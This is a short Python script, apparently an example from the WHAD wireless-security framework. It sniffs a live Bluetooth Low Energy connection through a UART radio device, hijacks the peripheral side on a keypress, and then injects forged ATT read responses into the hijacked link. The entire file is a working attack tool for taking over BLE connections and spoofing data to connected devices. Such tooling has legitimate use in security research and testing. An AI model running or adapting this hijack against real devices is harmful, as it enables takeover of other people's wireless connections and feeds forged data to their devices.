from whad.domain.ble import Sniffer, Hijacker, Peripheral
from whad.device.uart import UartDevice
from time import time,sleep
from whad.domain.ble.attribute import UUID
from scapy.all import BTLE_DATA, L2CAP_Hdr, ATT_Hdr, ATT_Read_Response
import sys

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        # Retrieve target device
        device = sys.argv[1]

        # Connect to target device and performs discovery
        try:
            dev = UartDevice(device, 115200)
            sniffer = Sniffer(dev)
            sniffer.configure(advertisements=False, connection=True)
            sniffer.start()
            while not sniffer.is_synchronized():
                sleep(1)
            print("Press enter to hijack.")
            input()
            hijacker = sniffer.available_actions(Hijacker)[0]
            success = hijacker.hijack(master=False, slave=True)
            if success:
                print("Slave successfully hijacked !")
                peripheral = hijacker.available_actions(Peripheral)[0]
                while True:
                    print("Press enter to send a read response.")
                    input()
                    peripheral.send_pdu(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Read_Response(value=b"ABCD"))

            else:
                print("Fail, exiting...")
        except (KeyboardInterrupt, SystemExit):
            dev.close()
    else:
        print('Usage: %s [device]' % sys.argv[0])